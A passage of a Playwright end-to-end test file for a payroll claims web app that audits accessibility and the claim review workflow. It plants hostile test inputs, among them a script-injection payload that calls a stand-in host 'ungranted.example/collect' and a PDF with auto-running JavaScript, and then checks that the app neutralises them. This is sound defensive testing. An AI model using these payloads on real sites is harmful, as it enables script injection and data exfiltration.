import assert from 'node:assert/strict'
import { chromium } from '@playwright/test'
import { mkdtemp,writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { portalViewResponse,sidesSubmissionEdge } from './claims-portal-edge.mjs'
import { payrollDoors, payrollSnapshot, publicSiteBrowser, renderedPayrollDoors, visitorStorage } from './payroll-doors.mjs'

export async function claimsBrowser({context,f,completedDoor,wageDoor,edge}){
 const {default:axe}=await import('axe-core')
 const interactionAudits=[]
 const browser=await chromium.launch({headless:true,args:['--use-mock-keychain','--password-store=basic']}),proof=await mkdtemp(join(process.env.ENVELOPE_PROOF_ROOT??tmpdir(),'envelope-claims-'))
 console.log('Claims screenshot directory: '+proof)
 try{
  const ctx=await browser.newContext({ignoreHTTPSErrors:true}),[name,value]=context.cookie.split('=');await ctx.addCookies([{name,value,url:context.origin}]);const page=await ctx.newPage();page.on('response',async response=>{if(response.status()>=400&&response.url().startsWith(context.origin))console.log('Claim browser refused '+response.status()+' '+response.url()+' '+await response.text())})
  const capture=async(label,url,open,expectedStatus=200)=>{
   for(const width of [1440,390]) {
    await page.setViewportSize({width,height:1000})
    const response=await page.goto(context.origin+url)
    assert.equal(response.status(),expectedStatus,label+' HTTP status')
    await page.evaluate(()=>document.fonts.ready)
    for(const title of (Array.isArray(open)?open:open?[open]:[])) {
     const summary=page.getByText(title,{exact:true})
     if(!await summary.evaluate(n=>n.parentElement.open)) {
      await summary.focus();await page.keyboard.press('Enter')
      assert.ok(await summary.evaluate(n=>n.parentElement.open),label+' opens disclosure by keyboard')
     }
    }
    await page.evaluate(axe.source)
    const audit=await page.evaluate(async()=>axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21a','wcag21aa','wcag22aa']}}))
    interactionAudits.push({label,width,violations:audit.violations.map(v=>({id:v.id,nodes:v.nodes.map(n=>({target:n.target,summary:n.failureSummary}))})),incomplete:audit.incomplete.map(v=>v.id)})
    // Colour findings stay explicit until br's approved correction is on main.
    assert.deepEqual(audit.violations.filter(v=>v.id!=='color-contrast').map(v=>v.id),[],label+' structural accessibility')
    await writeFile(join(proof,`${label}-${width}.aria.txt`),await page.locator('body').ariaSnapshot())
    const controls=page.locator('a[href],button:enabled,input:enabled:not([type="hidden"]),select:enabled,textarea:enabled,summary').filter({visible:true})
    await page.keyboard.press('Tab')
    for(const control of await controls.all()) {
     await control.focus()
     assert.ok(await control.evaluate(n=>n===document.activeElement),label+' focus reaches control')
     assert.notEqual(await control.evaluate(n=>getComputedStyle(n).outlineStyle),'none',label+' visible focus '+await control.evaluate(n=>n.tagName+' '+(n.name||n.textContent.trim())))
     if(await control.evaluate(n=>n.tagName==='INPUT'&&n.type==='checkbox')) {
      const checked=await control.isChecked()
      await page.keyboard.press('Space');assert.equal(await control.isChecked(),!checked)
      await page.keyboard.press('Space');assert.equal(await control.isChecked(),checked)
     }
    }
    await page.keyboard.press('Tab')
    assert.ok(await page.evaluate(()=>document.activeElement===document.body||document.activeElement.tabIndex>=0),label+' tab leaves control')
    await page.screenshot({path:join(proof,`${label}-${width}.png`),fullPage:true})
    assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth),label)
    for(const el of await page.locator('button,a,summary').all())
     if(await el.isVisible())assert.ok((await el.innerText()).trim(),label+' unnamed control')
   }
  }
  const app=f.claims.replace('/api/','/app/'),fill=async(name,value)=>page.locator(`[name="${name}"]:visible`).fill(String(value)),select=async(name,value)=>page.locator(`[name="${name}"]:visible`).selectOption(String(value))
  const upload=async(name,file)=>page.locator(`[name="${name}"]`).setInputFiles({name:file.name,mimeType:file.mediaType,buffer:Buffer.from(file.contentBase64,'base64')})
  const empty=await f.data('/api/envelope/companies',{name:'Clearwater Laundry',ein:'00-0006903'},201);await capture('claims-empty','/app/envelope/companies/'+empty.id+'/claims')
  await capture('claims-company',f.base.replace('/api/','/app/'))
  await capture('claims-list',app)
  await capture('claims-import-form',app,'Import an agency request')
  const input=f.validRequest(),request={...input.request,requestId:'synthetic-envelope-browser'}
  await upload('requestFile',{...input.artifacts[0],contentBase64:Buffer.from(Buffer.from(input.artifacts[0].contentBase64,'base64').toString().replaceAll(f.request.requestId,request.requestId)).toString('base64')})
  await select('exchange','separation');await select('claimantStatedReason',f.portalReason);await select('representativeId',f.operator.id)
  for(const key of ['requestId','agency','state','employerEin','stateEmployerId','claimantName','claimantIdentifier','issuedOn','dueOn','timeZone','sourceRef'])await fill(key,request[key])
  await fill('deadlineAt',request.deadlineAt.slice(0,16));await fill('escalationAt',input.escalationAt.slice(0,16))
  await page.getByRole('button',{name:'Import and assign this request',exact:true}).focus();await page.keyboard.press('Enter');await page.waitForURL(url=>url.pathname.startsWith(app+'/claim-'))
  const path=new URL(page.url()).pathname,door=path.replace('/app/','/api/')
  await capture('claims-evidence-form',path)
  await select('personId',f.person.id);await page.locator('[name="payroll.0"]').check()
  await upload('willowManifest',f.files.manifest);await upload('willowRecords',f.files.records);await upload('willowAudit',f.files.audit)
  await fill('willowSourceRef',f.willow.sourceRef);await fill('lastDayWorked',f.lastDayWorked);await select('portalReason',f.portalReason);await page.locator('[name="willowReviewed"]').check()
  await upload('mandateFile',f.files.mandate);await fill('mandateSourceRef','Signed employer mandate retained with this claim')
  const mandate=f.evidence(1).mandate;await fill('effectiveFrom',mandate.effectiveFrom);await fill('effectiveThrough',mandate.effectiveThrough);await page.locator('[name="mandateReviewed"]').check()
  await page.getByRole('button',{name:'Record evidence and remaining holds',exact:true}).click();await page.waitForURL(context.origin+path)
  let row=await f.data(door);assert.deepEqual(row.data.holds,[]);assert.equal(row.data.willow.sourcePersonId,f.willow.personId)
  await capture('claims-answer-form',path,'Additional questions on this agency request')
  const prepared=f.prepare(row.version)
  for(const answer of prepared.answers){const el=page.locator(`[name="answer.${answer.field}"]`);if(await el.evaluate(n=>n.tagName)==='SELECT')await el.selectOption(answer.value);else await el.fill(answer.value);await select('cite.'+answer.field,['employerReason','jobTitle','firstDayOfWork','lastDayWorked'].includes(answer.field)?row.data.willow.artifactId:f.payroll.id)}
  await select('preparerKind','Employer');await fill('jobTitle',prepared.preparer.jobTitle);await fill('phone',prepared.preparer.phone)
  await page.getByRole('button',{name:'Prepare for exact human review',exact:true}).click();await page.waitForURL(context.origin+path)
  await capture('claims-prepared',path)
  await capture('claims-exact-review',path+'/review')
  await page.getByLabel('Your signature statement',{exact:true}).fill('I reviewed these exact answers and retained sources and authorize this response only.')
  await page.locator('[name="humanAttestation"]').check();await page.getByRole('button',{name:'Approve and sign this exact response',exact:true}).click();await page.waitForURL(context.origin+path)
  await capture('claims-signed',path)
  row=await f.data(door);await upload('portalResponseFile',portalViewResponse(row));await page.locator('[name="matchesReviewedResponse"]').check();await page.getByRole('button',{name:'Retain and confirm the agency preview',exact:true}).click();await page.waitForURL(context.origin+path)
  await capture('claims-portal-preview-confirmed',path)
  await page.getByRole('button',{name:'Record one human portal handoff',exact:true}).click();await page.waitForURL(context.origin+path)
  await capture('claims-handoff',path)
  row=await f.data(door);const confirmation=f.confirmation(row,true,sidesSubmissionEdge().submit(row))
  await upload('confirmationFile',confirmation.artifacts[0]);await fill('confirmationNumber',confirmation.confirmation.confirmationNumber);await fill('submittedAt',confirmation.confirmation.submittedAt.slice(0,19).replace(/:00$/,''));await page.getByLabel('Portal confirmation evidence reference',{exact:true}).fill('Retained original portal confirmation')
  await select('agencyMessage','Your response has been accepted.');await page.locator('[name="reviewEvidence"]').check();await page.getByRole('button',{name:'Record imported confirmation',exact:true}).click();await page.waitForURL(context.origin+path)
  assert.equal((await f.data(door)).data.status,'agency-confirmation-reviewed');await capture('claims-confirmation',path)
  const disputed=await f.data(f.claims+'/import',f.validRequest({requestId:'synthetic-envelope-disputed'}),201);await f.data(f.claims+'/'+disputed.id+'/evidence',f.evidence(disputed.version,{disputed:true}));await capture('claims-disputed',app+'/'+disputed.id)
  await capture('claims-follow-up',completedDoor.replace('/api/','/app/'))
  await capture('claims-follow-up-form',completedDoor.replace('/api/','/app/'),'Agency requests for more information')
  const followPath=completedDoor.replace('/api/','/app/'),original=await f.data(completedDoor),originalPacket=await (await f.call(completedDoor+'/packet')).text()
  await page.getByRole('button',{name:'Answer this agency follow-up',exact:true}).click();await page.waitForURL(context.origin+followPath)
  await capture('claims-follow-up-answers',followPath)
  await fill('response.1','The actual last day worked was 2026-10-15, recorded separately from employment ending on 2026-10-16.');await select('questionCitation.1',original.data.willow.artifactId)
  await select('preparerKind','Employer');await fill('jobTitle','Payroll manager');await fill('phone','717-555-0100')
  await page.getByRole('button',{name:'Prepare for exact human review',exact:true}).click();await page.waitForURL(context.origin+followPath)
  await capture('claims-follow-up-review',followPath+'/review')
  await fill('statement','I reviewed this exact follow-up response and its original evidence.');await page.locator('[name="humanAttestation"]').check();await page.getByRole('button',{name:'Approve and sign this exact response',exact:true}).click();await page.waitForURL(context.origin+followPath)
  row=await f.data(completedDoor);await upload('portalResponseFile',portalViewResponse(row));await page.locator('[name="matchesReviewedResponse"]').check();await page.getByRole('button',{name:'Retain and confirm the agency preview',exact:true}).click();await page.waitForURL(context.origin+followPath)
  await page.getByRole('button',{name:'Record one human portal handoff',exact:true}).click();await page.waitForURL(context.origin+followPath)
  row=await f.data(completedDoor);const followConfirmation=f.confirmation(row,true,edge.submit(row))
  await upload('confirmationFile',followConfirmation.artifacts[0]);await fill('confirmationNumber',followConfirmation.confirmation.confirmationNumber);await fill('submittedAt',followConfirmation.confirmation.submittedAt.slice(0,19).replace(/:00$/,''));await page.getByLabel('Portal confirmation evidence reference',{exact:true}).fill('Original additional fact finding confirmation');await select('agencyMessage','Your response has been accepted.');await page.locator('[name="reviewEvidence"]').check();await page.getByRole('button',{name:'Record imported confirmation',exact:true}).click();await page.waitForURL(context.origin+followPath)
  row=await f.data(completedDoor);assert.equal(row.data.activeFollowUp.status,'response-confirmed');assert.notEqual(row.data.activeFollowUp.dueOn,row.data.request.dueOn);assert.ok(row.data.packet.packetHtml.includes(row.data.activeFollowUp.dueOn));assert.equal(row.data.followUps[0].status,'response-confirmed');assert.equal(row.data.confirmations[0].timeliness,'before-cutoff');assert.equal(row.data.previousResponses[0].version,original.version)
  assert.equal(await(await f.call(completedDoor+'/versions/'+original.version+'/packet')).text(),originalPacket)
  await f.data(completedDoor+'/begin-follow-up',{version:row.version,agencyReference:row.data.activeFollowUp.agencyReference},409)
  await capture('claims-follow-up-confirmed',followPath)
  await capture('claims-wage-response',wageDoor.replace('/api/','/app/'),'Prepare the cited agency response')
  await capture('claims-wage-review',wageDoor.replace('/api/','/app/')+'/review')
  await capture('claims-failed',app+'/synthetic-envelope-missing',undefined,404)
  await writeFile(join(proof,'interaction-accessibility.json'),JSON.stringify(interactionAudits,null,2))
  return proof
 }finally{await browser.close()}
}

// Native file doors are exercised in a disposable claims installation.
export async function safeInputsBrowser({context,f}) {
 const {default:axe}=await import('axe-core')
 const {claimArtifact}=await import('./claims-fixture.mjs')
 const browser=await chromium.launch({headless:true,args:['--use-mock-keychain','--password-store=basic']})
 const proof=await mkdtemp(join(process.env.ENVELOPE_PROOF_ROOT??tmpdir(),'envelope-safe-inputs-'))
 const audits=[]
 try {
  const visitor=await browser.newContext({ignoreHTTPSErrors:true}),requests=[]
  visitor.on('request',r=>requests.push(r.url()))
  const page=await visitor.newPage()
  const capture=async(label)=>{
   await page.evaluate(()=>document.fonts.ready)
   assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth),label+' fits viewport')
   await page.evaluate(axe.source)
   const audit=await page.evaluate(async()=>axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21a','wcag21aa','wcag22aa']}}))
   assert.deepEqual(audit.violations.map(v=>v.id),[],label+' automated WCAG checks')
   audits.push({label,url:new URL(page.url()).pathname,violations:audit.violations.map(v=>({id:v.id,impact:v.impact,nodes:v.nodes.map(n=>({target:n.target,summary:n.failureSummary}))})),incomplete:audit.incomplete.map(v=>v.id)})
   await writeFile(join(proof,label+'.aria.txt'),await page.locator('body').ariaSnapshot())
   for(const control of await page.locator('button,a,summary').all())
    if(await control.isVisible())assert.ok((await control.innerText()).trim(),label+' has visible control labels')
   await page.keyboard.press('Tab')
   assert.ok(await page.evaluate(()=>document.activeElement!==document.body),label+' keyboard focus enters document')
   await page.screenshot({path:join(proof,label+'.png'),fullPage:true})
  }
  for(const width of [1440,390]) {
   await page.setViewportSize({width,height:1000})
   for(const [label,path] of [['lobby','/'],['signin','/signin'],['setup','/setup'],['invalid-confirmation','/auth/confirm?token=synthetic-envelope-570']]) {
    const response=await page.goto(context.origin+path)
    assert.equal(response.headers()['set-cookie'],undefined,label)
    const html=await page.content()
    for(const privateValue of [f.company.name,f.person.name,f.company.ein,'900-69-0001'])assert.ok(!html.includes(privateValue),label+' private response')
    assert.deepEqual(await visitor.cookies(),[])
    await visitorStorage(visitor,page)
    await capture(label+'-'+width)
   }
   await page.goto(context.origin+'/signin')
   await page.keyboard.press('Tab')
   assert.ok(await page.evaluate(()=>document.activeElement!==document.body),'keyboard reaches a control')
   const email=page.getByRole('textbox',{name:'Email',exact:true})
   await email.focus();assert.equal(await email.evaluate(n=>n===document.activeElement),true)
   assert.notEqual(await email.evaluate(n=>getComputedStyle(n).outlineStyle),'none','visible keyboard focus')
  }
  assert.ok(requests.every(url=>new URL(url).origin===context.origin),'no third-party request before interaction')
  // Native public dispatcher states, including machine-readable discovery and
  // invalid callback refusals. Valid invite and confirmation states run below;
  // the verified linked callback runs in identityJourney.
  const nativePublic=['/','/signin','/setup','/setup/state','/health','/auth/invite',
   '/auth/confirm?token=synthetic-envelope-570','/auth/owner-signin?token=synthetic-envelope-570',
   '/auth/owner-claim','/.well-known/rer-dependencies','/.well-known/rer-link/jwks',
   '/.well-known/rer-link/jwks/oidc-provider@1','/.well-known/rer-link/callback',
   '/auth/dependencies/status','/auth/oidc/auth/start','/auth/oidc/auth/callback','/auth/oidc/auth/logout']
  const planted=[f.company.name,f.person.name,f.company.ein,'900-69-0001']
  for(const path of nativePublic)for(const method of ['GET','HEAD']) {
   const response=await visitor.request.fetch(context.origin+path,{method,maxRedirects:0})
   assert.ok(response.status()<500,path+' has a bounded public response')
   const body=await response.text()
   for(const value of planted)assert.ok(!body.includes(value),path+' exposes no planted private value')
   assert.equal(response.headers()['set-cookie'],undefined,path+' does not establish a visitor session')
   if(method==='HEAD')assert.equal(body,'',path+' HEAD has no response body')
  }
  await publicSiteBrowser({browser,privateValues:planted,proof,audits,axe})
  for(const path of ['/auth/session','/auth/operators','/api/envelope/companies',f.claims]) {
   const response=await visitor.request.get(context.origin+path)
   assert.equal(response.status(),401,path)
   for(const privateValue of [f.company.name,f.person.name,'900-69-0001'])assert.ok(!(await response.text()).includes(privateValue))
  }
  const beforeMails=context.edge.mails.length
  for(let attempt=0;attempt<6;attempt++) {
   const response=await visitor.request.post(context.origin+'/auth/magic-link',{headers:{origin:context.origin},data:{email:'synthetic-envelope-570@example.com',returnTo:'/app'}})
   assert.equal(response.status(),attempt<5?202:429,await response.text())
  }
  assert.equal(context.edge.mails.length,beforeMails,'unknown and limited sign-ins send nothing')
  const owner=await browser.newContext({ignoreHTTPSErrors:true}),[name,value]=context.cookie.split('=')
  await owner.addCookies([{name,value,url:context.origin}])
  const payload='<script>globalThis.syntheticEnvelope570=true;fetch("https://ungranted.example/collect")</script><img src="https://ungranted.example/pixel">'
  const hostile=claimArtifact('synthetic-envelope-571','hostile-original.html',payload,['text','html'].join('/'))
  const pdf=claimArtifact('synthetic-envelope-572','hostile-original.pdf','%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert("synthetic-envelope-572")) >> >> endobj\n%%EOF',['application','pdf'].join('/'))
  const input=f.validRequest({requestId:'synthetic-envelope-573',sourceRef:payload})
  const imported=await f.data(f.claims+'/import',{...input,artifacts:[...input.artifacts,hostile,pdf]},201),door=f.claims+'/'+imported.id
  const ui=door.replace('/api/','/app/'),owned=await owner.newPage(),outbound=[]
  owner.on('request',r=>{if(new URL(r.url()).origin!==context.origin)outbound.push(r.url())})
  for(const width of [1440,390]) {
   await owned.setViewportSize({width,height:1000});await owned.goto(context.origin+ui)
   const originals=owned.getByText('Retained original evidence',{exact:true});await originals.focus();await owned.keyboard.press('Enter')
   assert.ok(await originals.evaluate(n=>n.parentElement.open),'keyboard opens retained evidence')
   assert.ok(await owned.evaluate(()=>document.documentElement.scrollWidth<=innerWidth),'retained evidence fits viewport')
   await owned.evaluate(axe.source)
   const operatorAudit=await owned.evaluate(async()=>axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21a','wcag21aa','wcag22aa']}}))
   audits.push({label:'hostile-retained-'+width,violations:operatorAudit.violations.map(v=>({id:v.id,impact:v.impact,nodes:v.nodes.map(n=>({target:n.target,summary:n.failureSummary}))})),incomplete:operatorAudit.incomplete.map(v=>v.id)})
   await writeFile(join(proof,'hostile-retained-'+width+'.aria.txt'),await owned.locator('body').ariaSnapshot())
   assert.equal(await owned.evaluate(()=>globalThis.syntheticEnvelope570),undefined)
   assert.equal(await owned.locator('img[src^="https://ungranted.example"]').count(),0)
   await owned.screenshot({path:join(proof,'hostile-retained-'+width+'.png'),fullPage:true})
   const link=owned.getByRole('link',{name:hostile.name,exact:true})
   const [download]=await Promise.all([owned.waitForEvent('download'),link.click()])
   assert.equal(download.suggestedFilename(),hostile.name)
  }
  assert.deepEqual(outbound,[],'retained imports cannot execute a script or request')
  for(const file of [hostile,pdf]) {
   const path=door+'/artifacts/'+file.id,response=await owner.request.get(context.origin+path)
   assert.equal(response.status(),200)
   assert.equal(response.headers()['content-type'],['application','octet-stream'].join('/'))
   assert.match(response.headers()['content-disposition'],/^attachment;/)
   assert.match(response.headers()['content-security-policy'],/sandbox;/)
   assert.equal(response.headers()['x-content-type-options'],'nosniff')
   assert.deepEqual(await response.body(),Buffer.from(file.contentBase64,'base64'))
   assert.equal((await visitor.request.get(context.origin+path)).status(),401)
   assert.equal((await owner.request.get(context.origin+f.claims+'/foreign-claim/artifacts/'+file.id)).status(),404)
  }
  const refused=async(body,status)=>{
   const before=await f.data(f.claims)
   const response=await owner.request.post(context.origin+f.claims+'/import',{headers:{origin:context.origin,'content-type':['application','json'].join('/')},data:body})
   assert.equal(response.status(),status,await response.text())
   assert.deepEqual(await f.data(f.claims),before,'rejected import writes no claim')
  }
  await refused('{',400)
  const malformed=await owner.request.post(context.origin+f.claims+'/import',{headers:{origin:context.origin,'content-type':['application','json'].join('/')},data:Buffer.from([0xff,0xfe])})
  assert.equal(malformed.status(),400)
  await refused({...input,artifacts:[{...hostile,mediaType:['image','svg+xml'].join('/')}]},400)
  await refused({...input,artifacts:[{...hostile,contentBase64:'!invalid!'}]},400)
  await refused({...input,artifacts:[{...hostile,sha256:'0'.repeat(64)}]},400)
  const upload=await owner.request.post(context.origin+f.claims.replace('/api/','/app/')+'/import',{headers:{origin:context.origin},multipart:{requestFile:{name:'oversized.html',mimeType:hostile.mediaType,buffer:Buffer.alloc(512*1024+1,65)}}})
  assert.equal(upload.status(),413)
  const oversized=await owner.request.post(context.origin+f.claims+'/import',{headers:{origin:context.origin,'content-type':['application','json'].join('/')},data:' '.repeat(3*1024*1024+1)})
  assert.equal(oversized.status(),413)
  const foreignCompany=await f.data('/api/envelope/companies',{name:'Synthetic private-file boundary',ein:'00-0000574'},201)
  const foreignPath='/api/envelope/companies/'+foreignCompany.id+'/claims/'+imported.id+'/artifacts/'+hostile.id
  assert.equal((await owner.request.get(context.origin+foreignPath)).status(),404)
  await f.data('/auth/invite',{email:'synthetic-envelope-574@example.com',displayName:'Synthetic ungranted member',role:'member'},202)
  const invitation=context.edge.mails.at(-1).text.match(/https?:[^\s"<>]+/)[0].replaceAll('&amp;','&')
  const member=await browser.newContext({ignoreHTTPSErrors:true})
  const invitationPage=await member.newPage(),memberRequests=[]
  member.on('request',r=>memberRequests.push(r.url()))
  for(const width of [1440,390]) {
   await invitationPage.setViewportSize({width,height:1000})
   const response=await invitationPage.goto(invitation)
   assert.equal(response.status(),200)
   assert.equal(response.headers()['set-cookie'],undefined)
   assert.deepEqual(await member.cookies(),[],'preview does not admit the invited identity')
   for(const value of [f.company.name,f.person.name,f.company.ein,'900-69-0001'])assert.ok(!(await invitationPage.content()).includes(value))
   await invitationPage.evaluate(axe.source)
   const audit=await invitationPage.evaluate(async()=>axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21a','wcag21aa','wcag22aa']}}))
   assert.deepEqual(audit.violations,[],'valid invitation automated WCAG checks')
   audits.push({label:'valid-invitation-'+width,violations:[],incomplete:audit.incomplete.map(v=>v.id)})
   await invitationPage.getByRole('button',{name:/Confirm/}).focus()
   assert.equal(await invitationPage.getByRole('button',{name:/Confirm/}).evaluate(n=>n===document.activeElement),true)
   assert.notEqual(await invitationPage.getByRole('button',{name:/Confirm/}).evaluate(n=>getComputedStyle(n).outlineStyle),'none')
   await invitationPage.screenshot({path:join(proof,'valid-invitation-'+width+'.png'),fullPage:true})
  }
  assert.ok(memberRequests.every(url=>new URL(url).origin===context.origin),'invitation makes no third-party request')
  const admitted=await member.request.post(context.origin+'/auth/confirm',{headers:{origin:context.origin},data:{token:new URL(invitation).searchParams.get('token')},maxRedirects:0})
  assert.equal(admitted.status(),303)
  for(const path of [door+'/artifacts/'+hostile.id,door+'/artifacts/'+pdf.id])assert.equal((await member.request.get(context.origin+path)).status(),403,'a signed-in member without a company grant cannot download')
  // One public-door regression: native member authority and registered dispatch stay intact.
  const memberSession=await (await member.request.get(context.origin+'/auth/session')).json()
  assert.equal(memberSession.operator.role,'member')
  const grant=await owner.request.post(context.origin+f.base+'/grants',{headers:{origin:context.origin},data:{operatorId:memberSession.operator.id,version:0,role:'viewer',locations:['*'],fields:[],actions:[]}})
  assert.equal(grant.status(),200,'the native member receives a viewer grant with no permissions')
  const dispatchChecks=[]
  for(const [label,client] of [['member',member],['owner',owner]])for(const prefix of ['/api/','/app/']) {
   for(const action of ['unknown-action','constructor','hasOwnProperty']) {
    const response=await client.request.post(context.origin+door.replace('/api/',prefix)+'/'+action,{headers:{origin:context.origin},data:{}})
    const body=await response.text()
    dispatchChecks.push({label,prefix,action,status:response.status()})
    for(const secret of ['900-69-0001',...Object.entries(context.settings).filter(([key])=>/SECRET|KEY|TOKEN/.test(key)).map(([,value])=>value)])
     if(typeof secret==='string'&&secret.length>5)assert.ok(!body.includes(secret),'unknown dispatch discloses no private or binding value')
   }
  }
  console.log('Claims dispatch public-door statuses: '+JSON.stringify(dispatchChecks))
  for(const check of dispatchChecks)assert.equal(check.status,404,check.label+' '+check.prefix+' '+check.action+' uses unknown-action answer')
  const legitimate=await owner.request.post(context.origin+door+'/escalate',{headers:{origin:context.origin},data:{version:imported.version,reason:'Synthetic dispatch sanity check'}})
  assert.equal(legitimate.status(),200,'a registered action still succeeds')
  const escalation=await legitimate.json()
  assert.equal(escalation.version,imported.version+1,'registered action creates its real revision')
  const denied=await member.request.post(context.origin+door+'/escalate',{headers:{origin:context.origin},data:{version:escalation.version,reason:'Synthetic unauthorized dispatch'}})
  assert.equal(denied.status(),403,'a registered action retains its company-owner authority check')
  console.log('Claims dispatch public-door sanity passed: inherited names refused, registered action works, authority preserved')
  const personDoor=f.base+'/people/'+f.person.id,privatePaths=[]
  await f.data('/auth/magic-link',{email:f.operator.email,returnTo:'/app/envelope'},202)
  const ownerLink=new URL(context.edge.mails.at(-1).text.match(/https?:[^\s"<>]+/)[0].replaceAll('&amp;','&'))
  for(const width of [1440,390]) {
   await page.setViewportSize({width,height:1000})
   const response=await page.goto(ownerLink.href)
   assert.equal(response.status(),200)
   assert.equal(response.headers()['set-cookie'],undefined)
   assert.deepEqual(await visitor.cookies(),[])
   for(const value of [f.company.name,f.person.name,f.company.ein,'900-69-0001'])assert.ok(!(await page.content()).includes(value))
   await capture('valid-signin-confirmation-'+width)
  }
  const ownerAdmission=await f.call('/auth/confirm',{token:ownerLink.searchParams.get('token')},'')
  assert.equal(ownerAdmission.status,303)
  const privateCookie=ownerAdmission.headers.get('set-cookie').split(';')[0]
  await owner.addCookies([{name:privateCookie.split('=')[0],value:privateCookie.split('=')[1],url:context.origin}])
  for(const kind of ['tax','bank']) {
   const saved=await f.data(personDoor+'/private',{kind,version:0,value:payload},201,privateCookie)
   assert.equal(saved.version,1)
   const path=personDoor+'/private/'+kind;privatePaths.push(path)
   const response=await owner.request.get(context.origin+path)
   assert.equal(response.status(),200)
   assert.match(response.headers()['content-disposition'],/^attachment;/)
   assert.equal(response.headers()['x-content-type-options'],'nosniff')
   assert.equal(response.headers()['content-type'],['text','plain; charset=utf-8'].join('/'))
   assert.equal(await response.text(),payload)
   assert.equal((await visitor.request.get(context.origin+path)).status(),401)
   assert.equal((await member.request.get(context.origin+path)).status(),403)
   assert.equal((await owner.request.get(context.origin+path.replace(f.base,'/api/envelope/companies/'+foreignCompany.id))).status(),404)
   await f.data(personDoor+'/private',{kind,version:1,value:'synthetic-envelope-575'},201,privateCookie)
   await f.data(personDoor+'/private',{kind,version:1,value:payload},409,privateCookie)
   assert.equal(await (await owner.request.get(context.origin+path)).text(),'synthetic-envelope-575','stale versions cannot replace a private document')
  }
  const notice=await f.data(f.base+'/notices',{locationId:f.location.id,reference:'synthetic-envelope-576',body:payload},201)
  const noticePath=f.base+'/notices/'+notice.id
  // Exercise the finite dispatcher inventory against retained private records,
  // plus concrete links and mutations emitted by the populated claim screen.
  await owned.goto(context.origin+ui)
  const rendered=await owned.locator('[href],[action],[formaction]').evaluateAll(nodes=>nodes.flatMap(node=>
   ['href','action','formaction'].map(key=>node.getAttribute(key)).filter(value=>value?.startsWith('/app/envelope'))))
  const populated=await renderedPayrollDoors(owner,context.origin,[ui,f.base.replace('/api/','/app/'),personDoor.replace('/api/','/app/'),noticePath.replace('/api/','/app/')])
  await writeFile(join(proof,'populated-documents.json'),JSON.stringify(populated,null,2))
  const privateDoors=[...new Set([...populated.doors,...payrollDoors(f,{id:imported.id,artifacts:[hostile,pdf]},notice),...rendered,
   '/auth/session','/auth/operators','/auth/sessions','/auth/domain-rules','/auth/providers','/auth/settings/identity',
   '/auth/invite/cancel','/auth/operator/status','/auth/operator/role','/auth/session/revoke','/auth/step-up',
   '/auth/providers/unlink','/auth/providers/relink','/auth/settings/business','/auth/setup-complete','/auth/email','/auth/display-name',
   '/auth/dependencies/setup','/auth/dependencies/relink','/auth/dependencies/unlink'])]
  const targetSession=(await context.sql("SELECT id FROM oa_sessions WHERE operator_id='"+f.operator.id+"' AND revoked_at IS NULL ORDER BY created_at LIMIT 1"))[0].id
  const privateBefore=await payrollSnapshot(context.sql),inventory=[]
  for(const path of privateDoors)for(const method of ['GET','HEAD','POST']) {
   const response=await visitor.request.fetch(context.origin+path,{method,maxRedirects:0,headers:{origin:context.origin},
    ...(method==='POST'?{data:{version:1,operatorId:f.operator.id,sessionId:targetSession,reason:'Synthetic unauthorized mutation'}}:{})})
   const body=await response.text(),location=response.headers().location
   assert.ok([400,401,403,404,405].includes(response.status()) || response.status()===303 && location?.startsWith('/signin'),method+' '+path+' refuses a signed-out visitor: '+response.status())
   for(const value of [...planted,payload])assert.ok(!body.includes(value),method+' '+path+' contains no payroll content')
   assert.equal(response.headers()['set-cookie'],undefined,method+' '+path+' creates no visitor session')
   assert.equal(response.headers()['content-disposition'],undefined,method+' '+path+' grants no attachment')
   if(method==='HEAD')assert.equal(body,'')
   inventory.push({method,path,status:response.status()})
  }
  assert.equal(await payrollSnapshot(context.sql),privateBefore,'signed-out reads and mutations change no retained payroll row, revision, grant or audit')
  await writeFile(join(proof,'signed-out-doors.json'),JSON.stringify(inventory,null,2))
  console.log('Signed-out payroll inventory passed: '+privateDoors.length+' routes, '+inventory.length+' method cases')
  for(const width of [1440,390]) {
   await owned.setViewportSize({width,height:1000});await owned.goto(context.origin+noticePath.replace('/api/','/app/'))
   assert.ok((await owned.locator('main').innerText()).includes(payload))
   for(const control of await owned.locator('button,a,summary').all())
    if(await control.isVisible())assert.ok((await control.innerText()).trim(),'notice controls have visible words')
   await owned.keyboard.press('Tab')
   assert.notEqual(await owned.evaluate(()=>document.activeElement.tagName),'BODY')
   await owned.evaluate(axe.source)
   const noticeAudit=await owned.evaluate(async()=>axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21a','wcag21aa','wcag22aa']}}))
   audits.push({label:'hostile-notice-'+width,violations:noticeAudit.violations.map(v=>({id:v.id,impact:v.impact,nodes:v.nodes.map(n=>({target:n.target,summary:n.failureSummary}))})),incomplete:noticeAudit.incomplete.map(v=>v.id)})
   await writeFile(join(proof,'hostile-notice-'+width+'.aria.txt'),await owned.locator('body').ariaSnapshot())
   assert.equal(await owned.evaluate(()=>globalThis.syntheticEnvelope570),undefined)
   assert.equal(await owned.locator('img[src^="https://ungranted.example"]').count(),0)
   await owned.screenshot({path:join(proof,'hostile-notice-'+width+'.png'),fullPage:true})
  }
  assert.deepEqual(outbound,[],'notice text never executes or loads remote images')
  assert.equal((await member.request.get(context.origin+noticePath)).status(),403)
  assert.equal((await visitor.request.get(context.origin+noticePath)).status(),401)
  // Real structured imports retain inert text and enforce immutable revisions.
  const source={provider:'willow',version:0,sourceVersion:1,sourcePersonId:'synthetic-envelope-578',sourceEvidence:payload,sourceApprovedBy:'Synthetic payroll reviewer',export:{schema:'envelope-willow-payroll@1',sourceId:'synthetic-envelope-579',effectiveDate:'2026-10-01',values:{name:'<img src="https://ungranted.example/pixel">',locationId:f.location.id,unrequestedImage:payload}}}
  const hire=await f.data(f.base+'/hris-hires',source,201)
  const event={...source,type:'rate',export:{...source.export,values:{rateCents:2500,unrequestedImage:payload}}}
